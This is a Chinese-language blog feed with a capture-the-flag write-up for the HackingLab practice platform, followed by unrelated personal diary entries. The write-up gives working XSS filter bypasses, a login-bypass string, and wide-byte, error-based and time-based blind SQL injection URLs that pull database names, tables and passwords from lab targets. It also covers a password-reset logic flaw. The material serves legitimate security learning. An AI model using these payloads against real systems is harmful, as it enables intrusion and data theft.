&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/74619810.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Principle很重要的XSS&lt;/p>
&lt;p>我们的思路:
对于黑盒XSS,首先要知道在哪里过滤的,过滤了什么,如何过滤的,什么情况下触发过滤 即Where/What/How/When,之后便可以建立自己的Fuzz Testing Libs&lt;/p>
&lt;p>hint说看看过滤了什么，于是我们看看
过滤了：
&amp;lt; 左标签符,
onclick属性,
alert函数,&lt;/p>
&lt;p>偶然间尝试了两个on事件，onmouseover和onmouseout发现可以执行，于是相当easy,用脚本转换一下js语句，&lt;/p>
&lt;pre tabindex="0">&lt;code>'''word2ascii.py'''
#coding:utf8
string = 'alert(HackingLab)'
output_str = ''
for i in range(len(string)):
if i == (len(string)-1):
dot = ''
else:
dot = ','
output_str+=(str(ord(string[i]))+dot)
print(output_str)
&lt;/code>&lt;/pre>&lt;p>构造语句如下，&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/89396881.jpg" alt="img" />&lt;/p>
&lt;p>得到key，总算….
ps: 如果是onmouseover事件会被认为你想进行对这个网站的攻击….我也不知道为什么…onmouseout怎么就不算攻击了…估计要考虑过滤列表设计问题?&lt;/p>
&lt;p>总结: 还是多尝试，先给能触发js代码的事件列个表(最好)，各种情况触发条件都要心里有点数&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="注入关">注入关&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>最简单的SQL注入&lt;/p>
&lt;p>tips:login as admin&lt;/p>
&lt;p>尝试php万能密码&lt;/p>
&lt;p>admin’ 1=1#&lt;/p>
&lt;p>构造如下:&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/87504288.jpg" alt="img" />&lt;/p>
&lt;p>提交得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最简单的SQL注入(熟悉注入环境)&lt;/p>
&lt;p>tips:id=1，
很简单，什么都没过滤，于是一步步来就可以得到key&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/56025185.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>防注入&lt;/p>
&lt;p>tips:id=1&lt;/p>
&lt;p>试试发现过滤了and，那么用&amp;amp;&amp;amp;替代，&lt;/p>
&lt;p>终于报错了，发现响应头是gb2312，应该是要宽字节注入。不知道以前我是怎么做出来的，唯一想起来的就是以前测试宽字节注入也没怎么成功过，%df’总还是不能像别人博客里写的一样成功绕过，为什么呢????&lt;/p>
&lt;p>构造如下，产生报错
/index.php?id=1%df%27;%df%22–%20&lt;/p>
&lt;p>接下来开始继续尝试&lt;/p>
&lt;p>构造如下成功测试
/index.php?id=1%df’ order by 3 –%20&lt;/p>
&lt;p>然后
/index.php?id=1%df’ union select 1,2,3 –%20&lt;/p>
&lt;p>爆出数据库名
/index.php?id=1%df’ union select 1,database(),3 –%20&lt;/p>
&lt;p>然后
/index.php?id=1%df%27%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=0x6D79646273%20–%20&lt;/p>
&lt;p>爆出表名&lt;/p>
&lt;p>其实一般来说，应该要用limit一起，慢慢测试的，但因为这题比较简单，表就一个，于是不加limit也可以
还有一个注意点就是，碰到过滤单双引号的时候，可以考虑 需要单双引号的地方就直接把单双引号内的值转成十六进制 0x**** 的形式，直接代替单双引号的值，这样用不着单双引号也可以执行sql语句。&lt;/p>
&lt;p>知道表名后慢慢测试，构造
&lt;a class="link" href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,column_name,3%20from%20information_schema.columns%20where%20table_name=0x7361655F757365725F73716C6934%20limit%202,1%20--%20" target="_blank" rel="noopener"
>http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,column_name,3%20from%20information_schema.columns%20where%20table_name=0x7361655F757365725F73716C6934%20limit%202,1%20--%20&lt;/a>&lt;/p>
&lt;p>这里就要用limit了，方便一点，于是知道了所有列名&lt;/p>
&lt;p>最后构造
/index.php?id=1%df%27%20union%20select%201,id,content_1%20from%20sae_user_sqli4%20limit%202,1%20–%20&lt;/p>
&lt;p>得到key&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/3746210.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>到底能不能回显
分值: 350&lt;/p>
&lt;p>小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？&lt;/p>
&lt;p>我只想说…出题者戏真多..&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/72624166.jpg" alt="img" />
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/6099068.jpg" alt="img" />
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/90581991.jpg" alt="img" />
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/42995857.jpg" alt="img" />
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/27373701.jpg" alt="img" />
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/37220050.jpg" alt="img" />&lt;/p>
&lt;p>戏多这题也还是要做，测试发现它依旧存在宽字节注入，这不是重点，重点是它的语句类似于select * from table_name limit start,num&lt;/p>
&lt;p>于是…学习一下，limit后如何注入，忘记了…&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://www.freebuf.com/articles/web/57528.html" target="_blank" rel="noopener"
>http://www.freebuf.com/articles/web/57528.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>这里记一下mysql5.x的语法&lt;/p>
&lt;pre tabindex="0">&lt;code> SELECT
[ALL | DISTINCT | DISTINCTROW ]
[HIGH_PRIORITY]
[STRAIGHT_JOIN]
[SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
[SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
select_expr [, select_expr ...]
[FROM table_references
[WHERE where_condition]
[GROUP BY {col_name | expr | position}
[ASC | DESC], ... [WITH ROLLUP]]
[HAVING where_condition]
[ORDER BY {col_name | expr | position}
[ASC | DESC], ...]
[LIMIT {[offset,] row_count | row_count OFFSET offset}]
[PROCEDURE procedure_name(argument_list)]
[INTO OUTFILE 'file_name' export_options
| INTO DUMPFILE 'file_name'
| INTO var_name [, var_name]]
[FOR UPDATE | LOCK IN SHARE MODE]]
&lt;/code>&lt;/pre>&lt;p>从上至下顺序不能反的，可以没有这个语句但顺序要按这个来。
于是limit后有procedure 和into语句&lt;/p>
&lt;p>into不考虑，一般没有写权限…重点是Procedure，Mysql默认可用的存储过程只有ANALYSE([max_elements,[max_memory]])&lt;/p>
&lt;p>PROCEDURE ANALYSE 通过分析select查询结果对现有的表的每一列给出优化的建议&lt;/p>
&lt;p>PROCEDURE ANALYSE的语法如下:&lt;/p>
&lt;pre tabindex="0">&lt;code> select ... from ... where ... procedure analyse([max_elements,[max_memory]])
&lt;/code>&lt;/pre>&lt;p>这些仍然不是重点，重点是要让sql语句产生报错啊，也就是所谓的报错注入。&lt;/p>
&lt;p>writeup中的测试语句:&lt;/p>
&lt;p>/index.php?num=1&amp;amp;start=5 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)–%20&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/19403546.jpg" alt="img" />&lt;/p>
&lt;p>产生XPATH报错&lt;/p>
&lt;p>分析一下这句测试语句&lt;/p>
&lt;p>extractvalue()报错利用
举例:
select * from test_table and extractvalue(1,concat(0x7e,(select version())));&lt;/p>
&lt;p>报错结果:ERROR 1105 (HY000): XPATH syntax error: ‘~10.1.21-MariaDB’&lt;/p>
&lt;p>extractvalue很关键，要报错注入一般是 extractvalue(随意参数比如1，concat(随意字符，(输出错误语句比如:select version())))&lt;/p>
&lt;p>语句中 1是个相当”随便”的参数，字符’123’或者数字rand()都可以报错成功，
这个concat是必须的,没有concat的话，报错结果将会是个不完整的值，或者干脆返回空值。&lt;/p>
&lt;p>MID()函数，用于从文本字段中提取字符。&lt;/p>
&lt;p>语法：SELECT MID(column_name,start[,length]) FROM table_name;&lt;/p>
&lt;p>返回一个column_name被截取的字符构成的表
strat从1开始（不是从0）
length可选，是要提取的长度&lt;/p>
&lt;p>sql中的IF条件语句&lt;/p>
&lt;p>语法：IF( expr1 , expr2 , expr3 )&lt;/p>
&lt;p>expr1 的值为 TRUE，则返回值为 expr2
expr2 的值为FALSE，则返回值为 expr3&lt;/p>
&lt;p>应用示例:
select *,if(book_name=’java’,’有货’,’已卖完’) as product_status from book where price =50;&lt;/p>
&lt;p>LIKE操作符：&lt;/p>
&lt;p>string like pattern&lt;/p>
&lt;p>pattern示例: ‘%g’ 匹配以g结尾的string。&lt;/p>
&lt;p>“%” 可用于定义通配符（模式中缺少的字母）&lt;/p>
&lt;p>BENCHMARK()函数是 测试函数性能的函数，它有两个参数，第一个参数是要执行第二个参数的次数，第二个参数是一个语句，比如此处的sha1(1)，执行加密1 一定次数，&lt;/p>
&lt;p>综上，这道题难道tm的要用报错+延时!? 求求你放过我吧，&lt;/p>
&lt;p>改进测试语句&lt;/p>
&lt;p>变成 PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select database()),0x7e))),1)–%20
爆出数据库名&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/9860687.jpg" alt="img" />&lt;/p>
&lt;p>然后
PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=0x6D79646273 limit 0,1),0x7e))),1)–%20&lt;/p>
&lt;p>慢慢求limit返回的
0是article表，1是user表,其他没有了&lt;/p>
&lt;p>然后
PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=0x75736572 limit 0,1),0x7e))),1)–%20&lt;/p>
&lt;p>分别求article下的表和user下的表，直觉告诉我应该求user的，忘了说了，因为这题要考虑宽字节注入，所以可以把表名列名之类的转成十六进制&lt;/p>
&lt;p>求得user下的列名，
0是id，1是username，2是password，3是lastloginIP，其它就没有了&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/81237858.jpg" alt="img" />&lt;/p>
&lt;p>然后
PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select password from user limit 0,1),0x7e))),1)–%20&lt;/p>
&lt;p>直觉告诉我key在password下&lt;/p>
&lt;p>0是user，1是admin，2是myflagishere，3没有了我次奥&lt;/p>
&lt;p>username中，0是user，1是admin，2是flag&lt;/p>
&lt;p>user表下tm没有key我次奥?&lt;/p>
&lt;p>考虑article表
PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=0x61727469636C65 limit 0,1),0x7e))),1)–%20&lt;/p>
&lt;p>0是id，1是title，2是contents，3是isread，&lt;/p>
&lt;p>找了一遍没找到????????哪里没读到，不知道…测累了，睡觉，明天再找key&lt;/p>
&lt;hr>
&lt;p>误会了，原来key不是一串胡乱的字符&lt;/p>
&lt;p>key的确是在user表下,password列里，我的直觉的没错~
key是一串英文 myflagishere&lt;/p>
&lt;/li>
&lt;li>
&lt;p>邂逅&lt;/p>
&lt;p>分值: 350&lt;/p>
&lt;p>小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>tips给的是 id=1
然而id后测试注入似乎并不行，id=2发现是另一组数组，有图片，于是思考是否是图片路径存在注入
并没什么卵用，于是抓包，发现返回sqlerror，于是在bp里尝试注入
/images/cat1.jpg%df'%20order%20by%204%20--%2
得到表的列数为4
/images/cat1.jpg%df'%20union%20select%201,2,database(),4%20--%20
得到数据库名，mydbs
/images/cat1.jpg%df'%20union%20select%201,2,table_name,4%20from%20information_schema.tables%20where%20table_schema=0x6D79646273%20limit%200,1%20--%20
爆表名
0是article，1是pic
/images/cat1.jpg%df'%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=0x61727469636C65%20--%2
学到一个group_concat,不用再用limit一个个来尝试了，group_concat(column_name)
直接将要爆的article下的所有列名用逗号连接并返回。
爆列名
article下，id,title,content,others
pic下，id,picname,data,text
/images/cat1.jpg%df'%20union%20select%201,2,group_concat(picname),4%20from%20pic%20--%2
最后爆pic成功
得到flag
![](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/82252542.jpg)
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>ErrorBased&lt;/p>
&lt;p>分值: 150&lt;/p>
&lt;p>本题目为手工注入学习题目，主要用于练习基于Mysql报错的手工注入。Sqlmap一定能跑出来，所以不必测试了。flag中不带key和#
该题目需要在题目平台登录&lt;/p>
&lt;p>题目说的这么明白，那就直接上吧&lt;/p>
&lt;p>/index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20database()),0x7e));–%20&lt;/p>
&lt;p>爆出数据库 mydbs&lt;/p>
&lt;p>/index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x6D79646273),0x7e));–%20&lt;/p>
&lt;p>爆出所有表名
log,motto,user&lt;/p>
&lt;p>/index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x6D6F74746F),0x7e));–%20&lt;/p>
&lt;p>爆列名
motto下，id,username,motto
user下，id,username,password&lt;/p>
&lt;p>/index.php?username=admin%df%27%20and%20extractvalue(rand(),concat(0x7e,(select%20group_concat(username)%20from%20user),0x7e));–%20&lt;/p>
&lt;p>爆user
username列没有，password列没有
爆motto
motto列下，mymotto,happy everyday,nothing
username列下，admin,guest,test,#adf#ad@@#
最后一个应该就是flag&lt;/p>
&lt;/li>
&lt;li>
&lt;p>盲注&lt;/p>
&lt;p>分值: 200&lt;/p>
&lt;p>今天我们来学习一下盲注.小明的女朋友现在已经成了女黑阔,而小明还在每个月拿几k的收入,怎么养活女黑阔………..so:不要偷懒哦!&lt;/p>
&lt;p>盲注，当初这题盲注了一下午，也没弄出来&lt;/p>
&lt;p>sql中的substr()函数，
SUBSTR (str, pos, len）
由 中的第 位置开始，选出接下去的 个字元。
pos位置从1开始(不是从0)&lt;/p>
&lt;p>sleep() 函数
select sleep(3); 则mysql服务器3秒后才返回结果。&lt;/p>
&lt;p>盲注的原理一般是因为看不到页面返回的情况，所以有个技巧叫Timing Attack，延时注入，通过构造比如:
select if(substr((select database()),1,1) = ‘e’,sleep(5),0);&lt;/p>
&lt;p>利用了if条件句，substr函数和sleep函数，如果数据库第一个字符是e的话则等待5秒，否则为0&lt;/p>
&lt;p>那么在注入点后怎么构造呢…? 尝试了半天&lt;/p>
&lt;p>发现别人都是 select * from table_name and if(1=1,sleep(3),0);
就成功了，但是实际上，在mysql中这样就直接报错了，而我实际注入测试的时候也发现这并行不通。&lt;/p>
&lt;p>所以我尝试构造注入语句如下:&lt;/p>
&lt;p>select * from table_name union select if(1=1,sleep(3),0);&lt;/p>
&lt;p>报错，因为两个select返回的列并不一致，于是怎么想办法让它们一致，比如改成
select * from table_name union select if(1=1,sleep(3),0),1,1;&lt;/p>
&lt;p>依次尝试，但如果目标列非常多，这个效率肯定是很慢的。&lt;/p>
&lt;p>但目前只想出来这个，先凑合着用。&lt;/p>
&lt;p>构造如下：
/blind.php?username=admin’ union select if(1=1,sleep(20),1),1,1;%23&lt;/p>
&lt;p>测试成功，等待了20s，并且知道了目标有三列，知道了就好办。&lt;/p>
&lt;p>继续尝试构造，
/blind.php?username=admin’ union select if(substr((select database()),1,1)=’m’,sleep(20),1),1,1;%23&lt;/p>
&lt;p>的确等待了20s…所以就很好知道了，数据库名应该是mydbs，验证一下&lt;/p>
&lt;p>验证语句
‘ union select if((select database())=’mydbs’,sleep(20),1),1,1;%23&lt;/p>
&lt;p>同时，我们也可以用firebug来帮助查看是否成功
比如：&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/55452319.jpg" alt="img" />&lt;/p>
&lt;p>等待时间为20秒未免有点长，于是我们可以把它修改成10秒，因为网络问题，可能会有延迟，所以10秒的结果再配合我们习惯上的判断应该是可以猜解出来对应名称的。&lt;/p>
&lt;p>开始爆表
‘ union select if(substr((select table_name from information_schema.tables where table_schema=’mydbs’ limit 0,1),1,1)=’a’,sleep(10),1),1,1;%23&lt;/p>
&lt;p>..从a猜到l终于
第一个字符是l,第二个字符是o，于是我猜测是login之类的，于是搞了下，发现不对…
继续一个个字符，前三个得到 log&lt;/p>
&lt;p>这里插一句，mysql中，获取字符串长度的函数为length。&lt;/p>
&lt;p>比如 select length(‘111’); //返回3&lt;/p>
&lt;p>所以我们应该先要判断要查询值的长度，然后再一个个字符的查询。&lt;/p>
&lt;p>构造查长度语句:
‘ union select if(length((select table_name from information_schema.tables where table_schema=’mydbs’ limit 0,1))&amp;gt;2,sleep(10),1),1,1;%23&lt;/p>
&lt;p>多次测试知道了第一个table长度为3，就是log&lt;/p>
&lt;p>开始猜第二个的长度
%27%20union%20select%20if(length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27mydbs%27%20limit%201,1))=5,sleep(10),1),1,1;%23&lt;/p>
&lt;p>第二个表的长度为5，于是开始猜解字符
第一个字符是m，所以我判断应该是motto…&lt;/p>
&lt;p>判断正确，所以第二个表是motto。&lt;/p>
&lt;p>开始猜第三个表，长度得到为4，因为换了个稳定点的网络，所以我把时间再调小一点，sleep(5)。&lt;/p>
&lt;p>另外我猜测，第三个表是user，验证结果也为user。&lt;/p>
&lt;p>接下来猜第四个表，不存在，因为当我不论怎么判断长度都得不到返回值，于是可以断定没有第四个表。&lt;/p>
&lt;p>综上，结果有三个表，为: log,motto,user&lt;/p>
&lt;p>接下来猜每个表的列名，
先猜解user列下的，
第一列，长度为2，列名 id
第二列，长度为8, 列名 username
第三列，长度为8, 列名 password&lt;/p>
&lt;p>猜username列，值：admin，guest,test
猜password列，值：password,guest,1234&lt;/p>
&lt;p>再猜解motto下的
第一列，长度为2，列名 id
第二列，长度为8，列名 username
第三列，长度为5，列名 motto&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>猜username列，值：admin,guest,test,
打了一遍都没有找到，第四个值，于是用ascii函数来搞
sql中 ascii(string),返回string最左边字符的ascii值
比如 select ascii('1'); //返回49
构造
' union select if(ascii(substr((select username from motto limit 3,1),1,1))=35,sleep(5),1),1,1;%23
测试得到第一个字符ascii码值为35，也就是#号
慢慢得到 #adf#abd@@#
35 97 100 102 35 97 98 100 64 64 35
不正确?重新测试
35 97 100 102 35 97 100 64 64 35
#adf#ad@@#:key#notfound!#
不是这个我次奥，心态有点崩
那猜motto列，值：(7)mymotto,(14)happy everyday,(12)nothing help,(14)key#notfound!#
最后一个是答案，答案是 notfound!，我很烦，做这个做了一天啊。。。
还有两个注入关都没有这个盲注烦，实际上这个盲注应该写个脚本来跑的...
上传关三个好像挺简单的，改一改请求头里的一些后缀或者用用%00截断就ok了
&lt;/code>&lt;/pre>&lt;h2 id="解密关">解密关&lt;/h2>
&lt;p>1.以管理员身份登录系统&lt;/p>
&lt;pre tabindex="0">&lt;code>分值: 450
以管理员身份登录即可获取通关密码(重置即可，无需登录)
补充说明：假设除了admin用户，其它用户的邮箱都可被登录获取重置密码的链接。
用admin重置密码，不可行。于是随便一个用户重置密码，发现url是这样构造的
reset.php?sukey=fa34a2822dda85042a76a8352f1f40f4&amp;amp;username=1
reset.php?sukey=f0156cf8347e939e6720e614b804ac3c&amp;amp;username=123
这个sukey很特别啊，每次都是不一样的，所以试着md5解密，发现其实是个时间戳，于是尝试写一波脚本来搞搞看reset.php..
&lt;/code>&lt;/pre>&lt;h2 id="综合关">综合关&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>渗透测试第一期&lt;/p>
&lt;p>分值: 350&lt;/p>
&lt;p>注意：该题目模拟真实环境，故具有排他性，请选择合适的时间段完成该题。 你只有一部可用手机，手机号码会在需要手机号码的页面中给出。&lt;/p>
&lt;p>先注册账号比如test123，然后再到 忘记密码页面，填入账号test123获取手机验证码(手机号在源码中给出)，填完了把账号改成admin再post，这样就是改的admin的密码了。。&lt;/p>
&lt;p>然后在登录界面登录admin账户，得到key&lt;/p>
&lt;/li>
&lt;li>
&lt;p>没有注入到底能不能绕过登录&lt;/p>
&lt;p>分值: 350&lt;/p>
&lt;p>不是SQL注入&lt;/p>
&lt;p>题目网址的title写着brute force so easy，暗示要用密码爆破，弱口令字典之类的，我自己写了个，只是跑了遍数字，感觉实在太慢了。&lt;/p>
&lt;p>要登录，随便输了个1，1 爆error，又输了个test,test给了个提示说要进admin页面，想到robots.txt，于是一看还真有，disallow:/myadminroot/&lt;/p>
&lt;p>进入，提示说要login as admin，我抓包，username填admin，密码随便填，提示要login first。&lt;/p>
&lt;p>…然后我随便试了几个弱口令，还真特么撞对了…当年看一个密码爆破工具的字典的时候翻到的。&lt;/p>
&lt;p>admin admin123 nimda adminadmin….最后一个就成功了。。。爆出key&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/41754228.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>美图闪亮亮交友平台&lt;/p>
&lt;p>分值: 400&lt;/p>
&lt;p>小明今年19了，看到比自己还小两岁的妹妹都已经有了小男朋友，因此他也想找个女朋友了，于是就来到了美图闪亮亮交友平台，但是他怎么也没想到,上面的妹纸都不理他，于是他只好想办法；最后，他登录到了管理员姑娘的网页版邮箱，发现管理员姑娘其实已经暗恋他已久，于是乎，他们开始了一段惊人的地下恋情。&lt;/p>
&lt;p>通关地址&lt;/p>
&lt;p>ps:出题的人一定是想妹纸想疯了&lt;/p>
&lt;p>Tips: 邮箱没有xss漏洞&lt;/p>
&lt;p>Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823)&lt;/p>
&lt;p>这题，提示很多，说要有开放思维，又说没有后台，&lt;/p>
&lt;p>上传图片那个input栏它是可以被xss的
比如上传 &lt;a class="link" href="http://www.hackinglab.cn/meitu.jpg%22" target="_blank" rel="noopener"
>http://www.hackinglab.cn/meitu.jpg"&lt;/a> onclick=”alert(1)&lt;/p>
&lt;p>我猜测是要搞一段存储型css，发送到邮箱&lt;/p>
&lt;p>比如：&lt;/p>
&lt;p>将这段js代码插入到页面某处，&lt;/p>
&lt;p>搞了也没用啊，什么鬼啊。这肯定会爆cookie啊。不明白这题什么意思&lt;/p>
&lt;p>震惊! 当我更新文章时发现我上面的js脚本也被执行了。。。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>![](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/11808368.jpg)
&lt;/code>&lt;/pre>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>学到了挺多的，比如rot13加密，注意到”逻辑漏洞”这个问题，还有弱口令暴力破解&lt;/p>
&lt;p>一些sql注入的技巧和相关原理，data协议，base64加密的特征等等。总之，收获还蛮多的，开心: )&lt;/p></description></item><item><title>校园杂记16: 没有最好，只有最合适</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B016-%E6%B2%A1%E6%9C%89%E6%9C%80%E5%A5%BD%E5%8F%AA%E6%9C%89%E6%9C%80%E5%90%88%E9%80%82/</link><pubDate>Sun, 18 Mar 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B016-%E6%B2%A1%E6%9C%89%E6%9C%80%E5%A5%BD%E5%8F%AA%E6%9C%89%E6%9C%80%E5%90%88%E9%80%82/</guid><description>&lt;p>爬虫写着写着，用bp再次想抓一波包的时候发现什么都抓不到了，ip貌似被屏蔽了…有点后悔没有用代理ip，不谨慎啊……&lt;/p>
&lt;p>想抓tb订单的念头断了，忧郁，之前ali的api平台还能看到获取订单的api，现在找不到了，两会过后页面变了特别多，很多网站都是这样，思路断了，但是一样要写，不写白不写，不然之前买会员的钱不就白花了吗…虽然这样只能靠用户自觉…&lt;/p>
&lt;hr>
&lt;p>最近写爬虫写的真是想吐血。写爬虫，目标反爬，反反爬，目标反反反爬，生命真的就是这样浪费的吧。&lt;/p>
&lt;p>但我也发现，很多网站它不可能对反爬是”一步到位”的，直接就用最严厉的手段来反爬，抓到封ip，这也许就是”没有最好，只有最合适”吧。&lt;/p>
&lt;p>实际做事要考虑的事情非常多，不是直接就查看所有请求头，查看目标访问次数能解决的，还要考虑写这些对网页带宽的影响，几个用户可能没感觉，到几千上万乃至上亿，可能影响就积少成多非常巨大了，维持服务器要费用，提高带宽就意味着成本的增加，既然如此不如降低点反爬的标准，或者”人工”反爬也许都会比脚本反爬来的性价比高。&lt;/p>
&lt;hr>
&lt;p>看到篇文章说”如今的安全圈简直就是安全娱乐圈”，说到底就是浮躁吧。虽然我想说，就算是安全娱乐圈我也进不去啊，门槛是真特么高啊。我对它门槛的定义就是挖到一个有点深度的漏洞，是真驮马的难啊。&lt;/p>
&lt;p>4个月没弄过安全，当初吹的nb忘了吗? 再不醒醒，大清就亡了。&lt;/p></description></item><item><title>校园杂记15: 摸鱼摸爆，于是剃了个光头</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B015-%E6%91%B8%E9%B1%BC%E6%91%B8%E7%88%86%E4%BA%8E%E6%98%AF%E5%89%83%E4%BA%86%E4%B8%AA%E5%85%89%E5%A4%B4/</link><pubDate>Sat, 24 Feb 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B015-%E6%91%B8%E9%B1%BC%E6%91%B8%E7%88%86%E4%BA%8E%E6%98%AF%E5%89%83%E4%BA%86%E4%B8%AA%E5%85%89%E5%A4%B4/</guid><description>&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>剃完3秒就特么后悔了好吗!? 又冷又sb，光头hold不住: )&lt;/p>
&lt;hr>
&lt;p>光头的由来是这样的：&lt;/p>
&lt;p>上次撸完那个比赛的小程序，以为寒假所有task都解决了，躺床上想着，我要摸鱼摸爆，然后战ds2，战猎天使阿姨，下骑砍停不下来。&lt;/p>
&lt;p>摸了四天第一次看qq，消息多爆，看一条心里凉一下，什么寒假作业? 什么互联网+复赛? 什么改网页? 什么ps? 什么文档?&lt;/p>
&lt;p>摸了四天鱼我是做了什么错事了……于是脑子一热，理了波光头。&lt;/p>
&lt;p>现在感觉自己真是zz，头发做错了什么!&lt;/p>
&lt;hr>
&lt;p>…&lt;/p>
&lt;p>今天是不摸鱼日，于是把前面的打字软件的ui改好了，朋友说之前的ui有点丑，于是我也开始有点这么觉得，于是我就看着某金山打字通的ui，自己撸ps，撸了个初始界面，其实还能改一点，但是改不动了…感觉这样子看上去也还行了…&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/1687369.jpg" alt="img" />&lt;/p>
&lt;p>软件链接: &lt;a class="link" href="https://pan.baidu.com/s/1d3Vygu" target="_blank" rel="noopener"
>https://pan.baidu.com/s/1d3Vygu&lt;/a> 密码: ynsc&lt;/p>
&lt;p>还改了点小bug。文档ReadMe撸好。&lt;/p>
&lt;p>总的来说，这个小程序写的时候还是挺开心的，毕竟不像之前有个转换程序的task那样要考虑几十种边界数据，也不像另一个爬虫se那样要考虑多个线程之间的协调性…于是本体写完，撸撸ui，但是因为寒假，还掺杂着一丝摸鱼的心态，其实还是想到有很多地方可以改，偷懒偷了很多…感觉有点对不起队友们……&lt;/p>
&lt;hr>
&lt;p>老妈说的淘宝店在几天前弄好了，其实就是点点鼠标输入点东西的事情…淘宝的ui和各种应用都是不错的，它给店铺弄页面，叫做“装修”，总觉得哪里还是有点怪怪的，应该说面面俱到还是说有钱真是好呢…&lt;/p>
&lt;p>不对…突然想到，淘宝店铺的pc端界面还没弄，手机端界面虽然不用弄只要有商品就好了…但是弄个界面出来肯定宣传的更方便…心态炸裂：(&lt;/p>
&lt;hr>
&lt;p>还有校创改网页的事情，上次弄已经是三四个月前的事了…当时两个website，一个用的cms，一个直接手撸。这次要改的就是那个cms的…怎么改…我很烦那…开学前几天才跟我说这个，思路呢啊，改个什么东西来着，我也没看，用的好像是74cms，之前研究过它的一波源码，记下了改文本的几个位置，现在全忘了，当时以为不会再碰的…以后不管什么都要记下来 T T&lt;/p>
&lt;p>看到b站的uid，点进去再看到b站用户个人空间有个注册时间，我就顺着uid看了看，第一个账号果然是bishi，不知道是否是他当年写出来的b站呢，如果是的话那真是很有成就感的呢。看了别的id，都是些远古up主，也就不细看了。&lt;/p>
&lt;p>就突然想写个爬虫扒一扒用户注册时间看看b站用户增速怎么样，结果发现它似乎是用异步之类的加载的内容，之前就遇到过这种问题没有解决…现在又遇上了，研究一波吧。&lt;/p>
&lt;p>话说我明明是白帽子日记，已经好久没有搞过安全的什么东西了。&lt;/p>
